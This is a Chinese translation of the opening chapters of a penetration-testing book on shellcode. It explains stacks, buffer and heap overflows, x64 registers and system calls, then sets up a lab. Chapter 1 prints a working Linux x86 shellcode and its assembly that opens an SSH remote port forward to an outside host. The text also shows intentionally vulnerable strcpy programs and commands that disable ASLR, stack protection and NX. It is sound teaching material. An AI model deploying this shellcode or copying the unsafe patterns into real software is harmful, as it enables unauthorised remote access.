# 渗透测试 Shellcode（一）

> 原文：[`annas-archive.org/md5/490B2CAE1041BE44E9F980C77B842689`](https://annas-archive.org/md5/490B2CAE1041BE44E9F980C77B842689)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

本书主要介绍了如何发现缓冲区溢出漏洞，从头开始编写自己的 shellcode，学习操作系统的安全机制以及利用开发。您将了解如何使用 shellcode、汇编语言和 Metasploit 绕过操作系统和网络层的安全系统。您还将学习编写和修改 64 位 shellcode 以及内核级 shellcode 的概念。总的来说，本书是一本逐步指导的指南，将带您从低级安全技能到利用开发和 shellcode 的循环覆盖。

# 本书的读者对象

本书适合渗透测试人员、恶意软件分析人员、安全研究人员、取证从业人员、利用开发人员、C 语言程序员、软件测试人员以及安全领域的学生阅读。

# 本书涵盖内容

第一章，*介绍*，讨论了 shellcode、缓冲区溢出、堆破坏的概念，并介绍了计算机体系结构。

第二章，*实验室设置*，教授如何构建一个安全的环境来测试恶意代码，并向读者介绍调试器的图形界面。

第三章，*Linux 上的汇编语言*，解释了如何在 Linux 上使用汇编语言构建 shellcode。

第四章，*逆向工程*，介绍了如何使用调试器对代码进行逆向工程。

第五章，*创建 Shellcode*，解释了如何使用汇编语言和 Metasploit 构建 shellcode。

第六章，*缓冲区溢出攻击*，详细介绍了 Windows 和 Linux 上的缓冲区溢出攻击。

第七章，*利用开发-第 1 部分*，讨论了如何进行模糊测试和查找返回地址。

第八章，*利用开发-第 2 部分*，教授如何生成适当的 shellcode 以及如何在利用中注入 shellcode。

第九章，*真实场景-第 1 部分*，介绍了一个缓冲区溢出攻击的真实例子。

第十章，*真实场景-第 2 部分*，延续了前一章，但更加高级。

第十一章，*真实场景-第 3 部分*，提供了另一个真实场景的例子，但使用了更多的技术。

第十二章，*检测和预防*，讨论了检测和预防缓冲区溢出攻击所需的技术和算法。

# 充分利用本书

读者应该对操作系统内部有基本的了解（Windows 和 Linux）。对 C 语言的了解是必不可少的，熟悉 Python 会有所帮助。

本书中的所有地址都依赖于我的计算机和操作系统。因此，您的计算机上的地址可能会有所不同。

# 下载示例代码文件

您可以从[www.packtpub.com](http://www.packtpub.com)的帐户中下载本书的示例代码文件。如果您在其他地方购买了本书，可以访问[www.packtpub.com/support](http://www.packtpub.com/support)并注册，文件将直接通过电子邮件发送给您。

您可以按照以下步骤下载代码文件：

1.  在[www.packtpub.com](http://www.packtpub.com/support)上登录或注册。

1.  选择“支持”选项卡。

1.  单击“代码下载和勘误”。

1.  在搜索框中输入书名，然后按照屏幕上的说明操作。

文件下载后，请确保使用最新版本解压缩或提取文件夹：

+   WinRAR/7-Zip for Windows

+   Zipeg/iZip/UnRarX for Mac

+   7-Zip/PeaZip for Linux

该书的代码包也托管在 GitHub 上，网址为[`github.com/PacktPublishing/Penetration-Testing-with-Shellcode`](https://github.com/PacktPublishing/Penetration-Testing-with-Shellcode)</span>。我们还有其他代码包来自我们丰富的书籍和视频目录，可在**[`github.com/PacktPublishing/`](https://github.com/PacktPublishing/)**上找到。去看看吧！

# 下载彩色图像

我们还提供了一个 PDF 文件，其中包含本书中使用的屏幕截图/图表的彩色图像。您可以从[`www.packtpub.com/sites/default/files/downloads/PenetrationTestingwithShellcode_ColorImages.pdf`](https://www.packtpub.com/sites/default/files/downloads/PenetrationTestingwithShellcode_ColorImages.pdf)下载。

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：表示文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 用户名。以下是一个例子：“现在堆栈已恢复正常，`0x1234`已移至`rsi`。”

代码块设置如下：

```
mov rdx,0x1234
push rdx
push 0x5678
pop rdi
pop rsi
```

当我们希望引起您对代码块的特定部分的注意时，相关的行或项目将以粗体显示：

```
mov rdx,0x1234
push rdx
push 0x5678
pop rdi
pop rsi
```

任何命令行输入或输出都以以下形式编写：

```
$ nasm -felf64 stack.nasm -o stack.o
```

**粗体**：表示新术语、重要单词或屏幕上看到的单词。例如，菜单或对话框中的单词会以这种形式出现在文本中。以下是一个例子：“选择 GNU GCC 编译器，点击设置为默认，然后点击确定。”

警告或重要说明会以这种形式出现。

技巧和窍门会以这种形式出现。


# 第一章：介绍

欢迎来到*Shellcode 渗透测试*的第一章。术语**渗透测试**指的是攻击系统而不对系统造成任何损害。攻击背后的动机是在攻击者找到进入系统的方法之前，找到系统的缺陷或漏洞。因此，为了衡量系统抵抗暴露敏感数据的能力，我们尽可能收集尽可能多的数据，并使用 shellcode 执行渗透测试，我们必须首先了解溢出攻击。

缓冲区溢出是最古老且最具破坏性的漏洞之一，可能对操作系统造成严重损害，无论是远程还是本地。基本上，这是一个严重的问题，因为某些函数不知道输入数据是否能够适应预分配的空间。因此，如果我们添加的数据超过了分配的空间，那么这将导致溢出。有了 shellcode 的帮助，我们可以改变同一应用程序的执行流程。造成损害的主要核心是 shellcode 生成的有效载荷。随着各种软件的传播，即使有像微软这样的强大支持，也可能使您容易受到此类攻击。Shellcode 正是我们希望在控制执行流程后执行的内容，我们稍后将详细讨论。

本章涵盖的主题如下：

+   什么是堆栈？

+   什么是缓冲区？

+   什么是堆栈溢出？

+   什么是堆？

+   什么是堆破坏？

+   什么是 shellcode？

+   计算机体系结构介绍

+   什么是系统调用？

让我们开始吧！

# 什么是堆栈？

**堆栈**是内存中为每个运行的应用程序分配的空间，用于保存其中的所有变量。操作系统负责为每个运行的应用程序创建内存布局，在每个内存布局中都有一个堆栈。堆栈还用于保存返回地址，以便代码可以返回到调用函数。

堆栈使用**后进先出**（**LIFO**）来存储其中的元素，并且有一个堆栈指针（稍后我们会讨论它），它指向堆栈的顶部，并使用*push*将元素存储在堆栈顶部，使用*pop*从堆栈顶部提取元素。

让我们看下面的例子来理解这一点：

```
#include <stdio.h>
void function1()
{
    int y = 1;
    printf("This is function1\n");
}
void function2()
{
    int z = 2;
    printf("This is function2\n");
}
int main (int argc, char **argv[])
{  
    int x = 10;
    printf("This is the main function\n");
    function1();
    printf("After calling function1\n");
    function2();
    printf("After calling function2");
    return 0;
}
```

这就是上述代码的工作原理：

+   `main`函数将首先启动，将变量`x`推入堆栈，并打印出句子`This is the main function`，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00005.jpeg)

+   `main`函数将调用`function1`，在继续执行`function1`之前，将`printf("After calling function1\n")`的地址保存到堆栈中，以便继续执行流程。通过将变量`y`推入堆栈来完成`function1`后，它将执行`printf("This is function1\n")`，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00006.jpeg)

+   然后，再次返回到`main`函数执行`printf("After calling function1\n")`，并将`printf("After calling function2")`的地址推入堆栈，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00007.jpeg)

+   现在控制将继续执行`function2`，通过将变量`z`推入堆栈，然后执行`printf("This is function2\n")`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00008.jpeg)

+   然后，返回到`main`函数执行`printf("After calling function2")`并退出。

# 什么是缓冲区？

**缓冲区**是用于保存数据（如变量）的临时内存部分。缓冲区只能在其函数内部访问或读取，直到它被声明为全局；当函数结束时，缓冲区也随之结束；当存在数据存储或检索时，所有程序都必须处理缓冲区。

让我们看下面的代码行：

```
char buffer;
```

这段 C 代码的含义是什么？它告诉计算机分配一个临时空间（缓冲区），大小为`char`，可以容纳 1 个字节。您可以使用`sizeof`函数来确认任何数据类型的大小：

```
#include <stdio.h>
#include <limits.h>
int main()
{
    printf("The size for char : %d \n", sizeof(char));
    return 0;
}
```

当然，您也可以使用相同的代码来获取其他数据类型的大小，比如`int`数据类型。

# 什么是堆栈溢出？

**堆栈溢出**发生在将更多数据放入缓冲区中而它无法容纳时，这导致缓冲区被填满并覆盖内存中的相邻位置，剩下的输入。当负责复制数据的函数不检查输入是否能够适合缓冲区时，就会发生这种情况，比如`strcpy`。我们可以使用堆栈溢出来改变代码的执行流到另一个代码，使用 shellcode。

这是一个例子：

```
#include <stdio.h>
#include <string.h>
// This function will copy the user's input into buffer
void copytobuffer(char* input)
{
   char buffer[15];
   strcpy (buffer,input);
}
int main (int argc, char **argv[])
{
   copytobuffer(argv[1]);
   return 0;
}
```

代码的工作方式如下：

+   在`copytobuffer`函数中，它分配了一个大小为`15`个字符的缓冲区，但这个缓冲区只能容纳 14 个字符和一个空终止字符串`\0`，表示数组的结尾

您不必以空终止字符串结束数组；编译器会为您完成。

+   然后是`strcpy`，它从用户那里获取输入并将其复制到分配的缓冲区中

+   在`main`函数中，它调用`copytobuffer`并将`argv`参数传递给`copytobuffer`

当`main`函数调用`copytobuffer`函数时，实际发生了什么？

以下是这个问题的答案：

+   `main`函数的**返回地址**将被推送到内存中

+   **旧基址指针**（在下一节中解释）将保存在内存中

+   将分配一个大小为 15 字节或*15*8*位的缓冲区的内存部分：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00009.jpeg)

现在，我们同意这个缓冲区只能容纳 14 个字符，但真正的问题在于`strcpy`函数内部，因为它没有检查输入的大小，它只是将输入复制到分配的缓冲区中。

现在让我们尝试使用 14 个字符编译和运行此代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00010.jpeg)

让我们看看堆栈：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00011.jpeg)

如您所见，程序在没有错误的情况下退出。现在，让我们再试一次，但使用 15 个字符：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00012.jpeg)

现在让我们再看看堆栈：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00013.jpeg)

这是堆栈溢出，分段错误是内存违规的指示；发生的情况是用户的输入溢出了分配的缓冲区，从而填充了旧的基址指针和**返回地址**。

**分段错误**意味着用户空间内存中的违规，**内核恐慌**意味着内核空间中的违规。

# 什么是堆？

**堆**是应用程序在运行时动态分配的一部分内存。堆可以使用 C 语言中的`malloc`或`calloc`函数进行分配。堆与堆栈不同，因为堆会一直保留，直到：

+   程序退出

+   它将使用`free`函数删除

堆与堆栈不同，因为在堆中可以分配非常大的空间，并且在分配的空间上没有限制，例如在堆栈中，根据操作系统的不同，分配的空间是有限的。您还可以使用`realloc`函数调整堆的大小，但无法调整缓冲区的大小。在使用堆时，您必须在完成后使用`free`函数释放堆，但在堆栈中不需要；此外，堆栈比堆更快。

让我们看看下面的代码行：

```
 char* heap=malloc(15);
```

这段 C 代码的含义是什么？

它告诉计算机在堆内存中分配一个大小为`15`字节的部分，并且还应该容纳 14 个字符加上一个空终止字符串`\0`。

# 什么是堆损坏？

堆损坏发生在复制或推送到堆中的数据大于分配的空间时。让我们看一个完整的堆示例：

```

#include <string.h>
#include <stdlib.h>
void main(int argc, char** argv)
{
  // Start allocating the heap
    char* heap=malloc(15);
  // Copy the user's input into heap
    strcpy(heap, argv[1]);
  // Free the heap section
    free(heap);
}
```

在第一行代码中，使用`malloc`函数分配了一个大小为`15`字节的堆；在第二行代码中，使用`strcpy`函数将用户输入复制到堆中；在第三行代码中，使用`free`函数释放了堆，返回给系统。

让我们编译并运行它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00014.jpeg)

现在，让我们尝试使用更大的输入来使其崩溃：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00015.jpeg)

这个崩溃是堆破坏，迫使程序终止。

# 内存布局

这是一个包含以下内容的程序的完整内存布局：

+   `.text`部分用于保存**程序代码**

+   `.data`部分用于保存**初始化的数据**

+   `.BSS`部分用于保存**未初始化的数据**

+   **堆**部分用于保存**动态分配的变量**

+   **栈**部分用于保存非动态分配的变量，如缓冲区：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00016.jpeg)

看看**堆**和**栈**是如何增长的；**栈**从**高内存**增长到**低内存**，而**堆**从**低内存**增长到**高内存**。

# 什么是 shellcode？

Shellcode 就像是用机器语言编写的溢出利用中使用的有效载荷。因此，shellcode 用于在利用易受攻击的进程后覆盖执行流程，比如让受害者的机器连接回您以生成一个 shell。

下一个示例是用于 Linux x86 SSH 远程端口转发的 shellcode，执行`ssh -R 9999:localhost:22 192.168.0.226`命令：

```
"\x31\xc0\x50\x68\x2e\x32\x32\x36\x68\x38\x2e\x30\x30\x68\x32\x2e\x31\x36""\x66\x68\x31\x39\x89\xe6\x50\x68\x74\x3a\x32\x32\x68\x6c\x68\x6f\x73\x68""\x6c\x6f\x63\x61\x68\x39\x39\x39\x3a\x66\x68\x30\x39\x89\xe5\x50\x66\x68""\x2d\x52\x89\xe7\x50\x68\x2f\x73\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75""\x73\x72\x89\xe3\x50\x56\x55\x57\x53\x89\xe1\xb0\x0b\xcd\x80";
```

这是该 shellcode 的汇编语言：

```
xor    %eax,%eax
push   %eax
pushl  $0x3632322e
pushl  $0x30302e38
pushl  $0x36312e32
pushw  $0x3931
movl   %esp,%esi
push   %eax
push   $0x32323a74
push   $0x736f686c
push   $0x61636f6c
push   $0x3a393939
pushw  $0x3930
movl   %esp,%ebp
push   %eax
pushw  $0x522d
movl   %esp,%edi
push   %eax
push   $0x6873732f
push   $0x6e69622f
push   $0x7273752f
movl   %esp,%ebx
push   %eax
push   %esi
push   %ebp
push   %edi
push   %ebx
movl   %esp,%ecx
mov    $0xb,%al
int    $0x80
```

# 计算机架构

让我们来了解一些计算机架构（Intel x64）中的概念。计算机的主要组件如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00017.jpeg)

让我们更深入地了解 CPU。CPU 有三个部分：

+   **算术逻辑单元**（**ALU**）：这部分负责执行算术运算，如加法和减法，以及逻辑运算，如 ADD 和 XOR

+   **寄存器**：这是我们在本书中真正关心的内容，它们是 CPU 的超快速内存，我们将在下一节中讨论

+   **控制单元**（**CU**）：这部分负责 ALU 和寄存器之间的通信，以及 CPU 本身和其他设备之间的通信

# 寄存器

正如我们之前所说，寄存器就像是 CPU 的超快速内存，用于存储或检索处理中的数据，并分为以下几个部分。

# 通用寄存器

Intel x64 处理器中有 16 个通用寄存器：

+   累加器寄存器（**RAX**）用于算术运算—**RAX**持有**64**位，**EAX**持有**32**位，**AX**持有**16**位，**AH**持有**8**位，**AL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00018.jpeg)

+   基址寄存器（**RBX**）用作数据指针—**RBX**持有**64**位，**EBX**持有**32**位，**BX**持有**16**位，**BH**持有**8**位，**BL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00019.jpeg)

+   计数器寄存器（**RCX**）用于循环和移位操作—**RCX**持有**64**位，**ECX**持有**32**位，**CX**持有**16**位，**CH**持有**8**位，**CL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00020.jpeg)

+   数据寄存器（**RDX**）用作数据持有者和算术运算—**RDX**持有**64**位，**EDX**持有**32**位，**DX**持有**16**位，**DH**持有**8**位，**DL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00021.jpeg)

+   源索引寄存器（**RSI**）用作源指针—**RSI**持有**64**位，**ESI**持有**32**位，**DI**持有**16**位，**SIL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00022.jpeg)

+   目的索引寄存器（**RDI**）用作目的指针—**RDI**持有**64**位，**EDI**持有**32**位，**DI**持有**16**位，**DIL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00023.jpeg)**RSI**和**RDI**都用于流操作和字符串操作。

+   栈指针寄存器（**R****SP**）用作指向栈顶的指针—**RSP**持有**64**位，**ESP**持有**32**位，**SP**持有**16**位，**SPL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00024.jpeg)

+   基指针寄存器（**RBP**）用作栈的基址指针—**RBP**持有**64**位，**EBP**持有**32**位，**BP**持有**16**位，**BPL**持有**8**位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00025.jpeg)

+   寄存器 R8、R9、R10、R11、R12、R13、R14 和 R15 没有特定的操作，但它们的架构与先前的寄存器不同，比如**高**（**H**）值或**低**（**L**）值。但是，它们可以用作**D**表示**双字**，**W**表示**字**，或**B**表示**字节**。让我们以**R8**为例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00026.jpeg)

在这里，R8 保存 64 位，R8D 保存 32 位，R8W 保存 16 位，R8B 保存 8 位。

R8 到 R15 只存在于 Intel x64 而不是 x84。

# 指令指针

指令指针寄存器或 RIP 用于保存下一条指令。

让我们先看以下示例：

```
#include <stdio.h>
void printsomething()
{
    printf("Print something\n");
}
int main ()
{
    printsomething();

    printf("This is after print something function\n");
    return 0;
}
```

将执行的第一件事是`main`函数，然后它将调用`printsomething`函数。但在调用`printsomething`函数之前，程序需要确切地知道在执行`printsomething`函数后的下一个操作是什么。因此，在调用`printsomething`之前，下一条指令`printf("This is after print something function\n")`的位置将被推送到 RIP 等等：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00027.jpeg)

在这里，RIP 保存 64 位，EIP 保存 32 位，IP 保存 16 位。

以下表格总结了所有通用寄存器：

| **64 位寄存器** | **32 位寄存器** | **16 位寄存器** | **8 位寄存器** |
| --- | --- | --- | --- |
| RAX | EAX | AX | AH,AL |
| RBX | EBX | BX | BH, BL |
| RCX | ECX | CX | CH, CL |
| RDX | EDX | DX | DH,DL |
| RSI | ESI | SI | SIL |
| RDI | EDI | DI | DIL |
| RSP | ESP | SP | SPL |
| RBP | EBP | BP | BPL |
| R8 | R8D | R8W | R8B |
| R9 | R9D | R9W | R9B |
| R10 | R10D | R10W | R10B |
| R11 | R11D | R11W | R11B |
| R12 | R12D | R12W | R12B |
| R13 | R13D | R13W | R13B |
| R14 | R14D | R14W | R14B |
| R15 | R15D | R15W | R15B |

# 标志寄存器

这些是计算机用来控制执行流程的寄存器。例如，汇编中的 JMP 操作将根据标志寄存器的值执行，比如“跳转如果为零”（JZ）操作，这意味着如果零标志包含 1，执行流程将被改变到另一个流程。我们将讨论最常见的标志：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00028.jpeg)

+   如果在算术运算中有加法进位或减法借位，则设置进位标志（CF）。

+   如果设置位的数量为偶数，则设置奇偶标志（PF）。

+   如果在算术运算中有二进制代码十进位的进位，则设置调整标志（AF）。

+   如果结果为零，则设置零标志（ZF）。

+   如果最高有效位为 1（数字为负数），则设置符号标志（SF）。

+   在算术运算中，如果操作的结果太大而无法容纳在寄存器中，将设置溢出标志（OF）。

# 段寄存器

共有六个段寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00029.jpeg)

+   代码段（CS）指向堆栈中代码段的起始地址

+   堆栈段（SS）指向堆栈的起始地址

+   数据段（DS）指向堆栈中数据段的起始地址

+   额外段（ES）指向额外数据

+   F 段（FS）指向额外数据

+   G 段（GS）指向额外数据

FS 中的 F 表示 E 后的 F；而 GS 中的 G 表示 F 后的 G。

# 端序

端序描述了在内存或寄存器中分配字节的顺序，有以下两种类型：

+   “大端”意味着从左到右分配字节。让我们看看像*shell*这样的单词（十六进制为**73** **68** **65** **6c** **6c**）将如何在内存中分配：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00030.jpeg)

它按从左到右的顺序推送。

+   “小端”意味着从右到左分配字节。让我们看看以小端方式处理前面的例子：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00031.jpeg)

正如你所看到的，它向后推了*llehs*，而最重要的是英特尔处理器是小端序的。

# 系统调用

在 Linux 内存（RAM）中有两个空间：用户空间和内核空间。内核空间负责运行内核代码和系统进程，并具有对内存的完全访问权限，而用户空间负责运行用户进程和应用程序，并具有对内存的受限访问权限，这种分离是为了保护内核空间。

当用户想要执行一个代码（在用户空间），用户空间通过系统调用发送请求给内核空间，也被称为 syscalls，通过诸如 glibc 的库，然后内核空间使用 fork-exec 技术代表用户空间执行它。

# 什么是系统调用？

系统调用就像用户空间用来请求内核代表用户空间执行的请求。例如，如果一个代码想要打开一个文件，那么用户空间会发送打开系统调用给内核，代表用户空间打开文件，或者当一个 C 代码包含`printf`函数时，用户空间会发送写系统调用给内核：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00032.jpeg)

fork-exec 技术是 Linux 通过 fork 系统调用复制父进程在内存中的资源，然后使用 exec 系统调用运行可执行代码的方式来运行进程或应用程序。

系统调用就像内核 API，或者说你要如何与内核本身交流，告诉它为你做一些事情。

用户空间是一个隔离的环境或沙盒，用来保护内核空间及其资源。

那么我们如何获取 x64 内核系统调用的完整列表呢？实际上很容易，所有系统调用都位于这个文件中：`/usr/include/x86_64-linux-gnu/asm/unistd_64.h`：

```
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h 
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00033.jpeg)

这只是我的内核系统调用的一小部分。

# 总结

在本章中，我们讨论了计算机科学中的一些定义，如堆栈、缓冲区和堆，还简要提到了缓冲区溢出和堆破坏。然后，我们转向了计算机体系结构中的一些定义，比如寄存器，在调试和理解处理器内部执行方式方面非常重要。最后，我们简要讨论了系统调用，在 Linux 汇编语言中也很重要（我们将在下一部分中看到），以及内核如何在 Linux 上执行代码。在这一点上，我们已经准备好进入另一个层次，即构建一个环境来测试溢出攻击，并创建和注入 shellcode。


# 第二章：实验室设置

在本章中，我们将建立一个隔离的实验室，用于本书的其余部分。我们将看到如何安装诸如 Metasploit 框架之类的工具，以创建 shellcode 和利用开发。我们还将看到如何在 Microsoft Windows 上安装 C 语言 IDE 和编译器，然后再看看 Windows 和 Linux 上的 Python 编程语言。然后，我们将看看安装和熟悉调试器界面

首先，我们需要三台机器。第一台是用于模拟远程攻击的攻击者，将是 Linux 操作系统。在这里，我更喜欢 Kali Linux，因为它包含了我们需要的所有工具，另外我们还将安装一些额外的工具。第二台将是 Ubuntu 14.04 LTS x64，第三台将是 Windows 7 x64。

本章涵盖的主题如下：

+   配置攻击者机器

+   配置 Linux 受害者机器

+   配置 Windows 受害者机器

+   配置 Linux 受害者机器

+   配置 Ubuntu 以进行 x86 汇编

+   网络

您可以使用 VMware、KVM 或 VirtualBox，但请确保选择仅主机网络，因为我们不希望将这些易受攻击的机器暴露给外部世界。

# 配置攻击者机器

如我之前所说，攻击者机器将是我们的主要基地，我更喜欢 Kali Linux，但如果您要使用其他发行版，那么您必须安装以下软件包：

1.  首先，我们需要确保 C 编译器已安装；使用`gcc -v`命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00034.jpeg)

1.  如果没有，只需使用`$ sudo apt-get install gcc`（Debian 发行版）或`$ sudo yum install gcc`（Red Hat 发行版）。接受并安装带有其依赖项的`gcc`。

1.  此外，我们将在利用开发中使用 Python 编程语言。Python 默认随大多数 Linux 发行版一起安装，要确保它已安装，只需使用`$ python -V`或`python`。然后，Python 解释器将启动（按*Ctrl* + *D*退出）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00035.jpeg)

1.  对于文本编辑器，我使用`nano`作为我的 CLI 文本编辑器，`atom`作为我的 GUI 文本编辑器；`nano`也随大多数 Linux 发行版一起安装。

1.  如果要安装`atom`，请转到[`github.com/atom/atom/releases/`](https://github.com/atom/atom/releases/)，您将找到一个测试版和稳定版。然后，根据您的系统下载 Atom 软件包，`.deb`或`.rpm`，并使用`$ sudo dpkg -i package-name.deb`（Debian 发行版）或`$ sudo rpm -i package-name.rpm`（Red Hat 发行版）进行安装。

这就是 Atom 界面的样子：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00036.jpeg)

在创建 shellcode 和利用开发时，我们将使用 Metasploit 框架。要安装 Metasploit，我建议您使用全自动安装程序通过[`github.com/rapid7/metasploit-framework/wiki/Nightly-Installers`](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)。这个脚本将安装 Metasploit 以及它的依赖项（Ruby 和 PostgreSQL）。看下一个例子（在 ARM 上安装 Metasploit，但与 Intel 相同）：

1.  首先，使用`curl`命令获取安装程序：

```
 $ curl https://raw.githubusercontent.com/rapid7/
        metasploit-omnibus/master/config/templates/
        metasploit-framework-wrappers/msfupdate.erb > msfinstall
```

1.  然后，使用`chmod`命令给予适当的权限：

```
 $ chmod 755 msfinstall
```

1.  然后，启动安装程序：

```
 $ ./msfinstall
```

1.  现在它将开始下载 Metasploit 框架以及它的依赖项。

1.  要为 Metasploit 框架创建数据库，只需使用`msfconsole`并按照说明操作：

```
 $ msfconsole
```

1.  然后，它将设置一个新的数据库，Metasploit 框架开始：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00037.jpeg)

1.  由于我们将使用汇编编程语言，让我们看看汇编器（`nasm`）和链接器（`ld`）。

1.  首先，我们需要使用`$ sudo apt-get install nasm`来安装`nasm`（Debian 发行版）。对于 Red Hat 发行版，根据 NASM 的网站，您首先需要将此存储库添加到您的`/etc/yum/yum.repos.d`中作为`nasm.repo`：

```
[nasm]
name=The Netwide Assembler
baseurl=http://www.nasm.us/pub/nasm/stable/linux/
enabled=1
gpgcheck=0

[nasm-testing]
name=The Netwide Assembler (release candidate builds)
baseurl=http://www.nasm.us/pub/nasm/testing/linux/
enabled=0
gpgcheck=0

[nasm-snapshot]
name=The Netwide Assembler (daily snapshot builds)
baseurl=http://www.nasm.us/pub/nasm/snapshots/latest/linux/
enabled=0
gpgcheck=0
```

1.  然后，使用`$ sudo yum update && sudo yum install nasm`来更新和安装`nasm`，以及`$ nasm -v`来获取 NASM 的版本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00038.jpeg)

1.  使用命令`$ ld -v`来获取链接器的版本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00039.jpeg)

# 配置 Linux 受害机器

这台机器将是 Ubuntu 14.04 x64。您可以从[`releases.ubuntu.com/14.04/`](http://releases.ubuntu.com/14.04/)下载它。此外，我们必须遵循先前的指示来安装`gcc`，Python 和`nasm`。

现在，让我们安装一个非常友好的 GUI，名为 edb-debugger。您可以按照此页面[`github.com/eteran/edb-debugger/wiki/Compiling-(Ubuntu)`](https://github.com/eteran/edb-debugger/wiki/Compiling-(Ubuntu))或按照下一个指示。

首先，使用以下命令安装依赖项：

```
$ sudo apt-get install cmake build-essential libboost-dev libqt5xmlpatterns5-dev qtbase5-dev qt5-default libgraphviz-dev libqt5svg5-dev git
```

然后，克隆并编译 Capstone 3.0.4，如下所示：

```
$ git clone --depth=50 --branch=3.0.4 https://github.com/aquynh/capstone.git
$ pushd capstone
$ ./make.sh
$ sudo ./make.sh install
$ popd
```

然后，克隆并编译 edb-debugger，如下所示：

```
$ git clone --recursive https://github.com/eteran/edb-debugger.git
$ cd edb-debugger
$ mkdir build
$ cd build
$ cmake ..
$ make
```

然后，使用`$ sudo ./edb`命令启动 edb-debugger，打开以下窗口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00040.jpeg)

正如我们所看到的，edb-debugger 有以下四个窗口：

+   反汇编窗口将机器语言转换为汇编语言

+   寄存器窗口包含所有寄存器的当前内容

+   数据转储窗口包含当前进程的内存转储

+   堆栈窗口包含当前进程的堆栈内容

现在到最后一步。为了学习目的，需要禁用**地址空间布局随机化**（**ASLR**）。这是 Linux 中的一种安全机制，我们稍后会谈论它。

只需执行`$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`命令。

此外，我们将在使用`gcc`进行编译时禁用堆栈保护程序和 NX，使用：

```
$ gcc -fno-stack-protector -z execstack
```

# 配置 Windows 受害机器

在这里，我们将配置 Windows 机器作为受害机器，这是 Windows 7 x64。

首先，我们需要安装 C 编译器和 IDE，我建议使用*Code::Blocks*，要安装它，从[`www.codeblocks.org/downloads/binaries.`](http://www.codeblocks.org/downloads/binaries)下载二进制文件。在这里，我将安装`codeblocks-16.01mingw-setup.exe`（最新版本）。下载并安装`mingw`版本。

在首次启动*Code::Blocks*时，将弹出一个窗口以配置编译器。选择 GNU GCC Compiler，点击 Set as default，然后点击 OK：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00041.jpeg)

然后，IDE 界面将弹出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00042.jpeg)

现在我们有了 C 编译器和 IDE。现在，让我们转向安装调试器。

